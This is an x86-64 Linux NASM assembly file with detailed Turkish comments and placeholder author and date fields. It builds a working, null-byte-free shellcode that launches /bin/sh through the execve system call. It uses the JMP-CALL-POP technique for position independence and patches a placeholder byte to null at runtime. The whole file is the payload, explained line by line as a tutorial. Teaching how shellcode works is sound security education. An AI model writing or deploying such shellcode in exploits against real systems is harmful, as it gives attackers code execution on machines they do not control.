; spawn_shell.nasm
; Yazar: [Kendi Adınız / Kullanıcı Adınız]
; Tarih: [Güncel Tarih]
; Amaç: x86-64 Linux üzerinde execve("/bin/sh", ...) sistem çağrısını
;       kullanarak yeni bir komut satırı başlatmak.

; Linker için başlangıç noktasını belirtiyoruz.
global _start

; .text bölümü, çalıştırılabilir kodun bulunduğu yerdir.
section .text

_start:
    ; --- Adım 1: Konumdan Bağımsız Kod (PIC) ile String'in Adresini Almak ---
    ; Shellcode belleğin herhangi bir yerine yüklenebilir, bu yüzden string'imizin
    ; mutlak adresini bilemeyiz. JMP-CALL-POP tekniği ile kendi konumumuza
    ; göre bu adresi dinamik olarak bulacağız.

    ; 'call_shellcode' etiketine kısa bir atlama yap.
    ; 'short' komutu, shellcode'u daha küçük tutmak için kullanılır (2 byte).
    jmp short call_shellcode

get_string:
    ; 'call' komutu, geri dönüş adresini (yani kendisinden bir sonraki
    ; komutun adresini) stack'e atar. Bizim durumumuzda bu, '/bin/shX'
    ; string'imizin başlangıç adresidir.

    ; Stack'in en üstündeki bu adresi RDI yazmacına çekiyoruz.
    pop rdi
    ; Şimdi RDI, '/bin/shX' string'inin adresini tutuyor.
    ; Bu, execve syscall'unun ilk argümanı (filename) olacak.

    ; --- Adım 2: execve Syscall'unu Hazırlamak ---

    ; Argüman 2 (argv): ["/bin/sh", NULL]
    ; Bu diziyi stack üzerinde oluşturacağız.

    ; Önce '/bin/shX' string'inin sonundaki 'X' karakterini NULL byte
    ; ile değiştirelim. String'imiz 7 byte olduğu için 8. byte'ı (offset 7)
    ; hedefliyoruz.
    xor rax, rax        ; RAX'ı sıfırla. AL (RAX'ın alt 8 biti) de 0 olur.
    mov [rdi + 7], al   ; [rdi+7] adresine 0 yaz. String şimdi: "/bin/sh\0"

    ; argv dizisinin sonlandırıcısı olan NULL pointer'ı stack'e at.
    ; 8 byte'lık NULL (0x0000000000000000)
    push rax

    ; argv dizisinin ilk elemanı olan string'imizin adresini (RDI'daki değer) stack'e at.
    push rdi

    ; Stack'in güncel tepesi (RSP), bizim argv dizimizin başlangıcını gösteriyor.
    ; Bu adresi RSI'ya alarak execve'nin ikinci argümanını hazırlıyoruz.
    mov rsi, rsp

    ; Argüman 3 (envp): NULL
    ; RDX'i sıfırlayarak NULL pointer elde ediyoruz.
    xor rdx, rdx

    ; Syscall Numarası: 59 (execve)
    ; 'mov rax, 59' komutu NULL byte'lar (\x00) içerebilir.
    ; RAX'ı zaten sıfırladığımız için, sadece alt 8-bit'lik kısmına (AL)
    ; 59 değerini yazmak daha güvenli ve kısadır.
    mov al, 59

    ; Her şey hazır, çekirdeği çağır.
    syscall

call_shellcode:
    ; Bu komutun tek amacı, bir sonraki satırın (string'imizin) adresini
    ; stack'e atıp hemen ardından 'get_string' etiketine zıplamaktır.
    call get_string
    ; Çalıştırılacak komutun string hali. 'X' bir yer tutucudur (placeholder)
    ; ve yukarıdaki kod tarafından NULL ile değiştirilecektir.
    db '/bin/shX'
